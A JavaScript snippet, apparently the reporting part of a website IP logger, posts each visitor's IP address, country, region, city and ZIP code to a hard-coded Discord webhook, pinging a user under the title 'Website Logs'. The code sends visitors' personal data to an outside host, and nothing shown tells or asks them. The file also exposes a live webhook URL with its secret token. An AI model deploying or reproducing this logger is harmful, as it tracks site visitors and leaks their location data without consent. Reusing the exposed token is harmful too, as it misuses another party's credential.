// i skidded this and i dont care!
var webHookUrl = "https://discord.com/api/webhooks/1023549116892065852/HlTKEpZU_PlngLuG5JAYp5U-rPbfOIRHgjyKL8Z5dsX4EWJ4s8IrtU_0tsWjKIkfP39W";

function logs(json) {
    var request = new XMLHttpRequest();

    request.open("POST", webHookUrl);

    request.setRequestHeader('Content-type', 'application/json');

    var params = {
        username: "teaclub.tech",
        avatar_url: "https://cdn.discordapp.com/avatars/339439383486791691/4ee7e1ff869f2f5615087a89522e7006.png?size=4096", // Just Add an url to have an avatar on your webhook
        content: "<@!256486105451462657>",
        embeds: [{
            title: "Website Logs",
            color: 16711680,
            description: "**IP:** `" + json.ip + "`\n**Country:** `" + json.country + "`\n**Region:** `" + json.region + "`\n**Town/City:** `" + json.city + "`\n**ZIP:** `" + json.postal + "`"
        }]
    }

    request.send(JSON.stringify(params));
}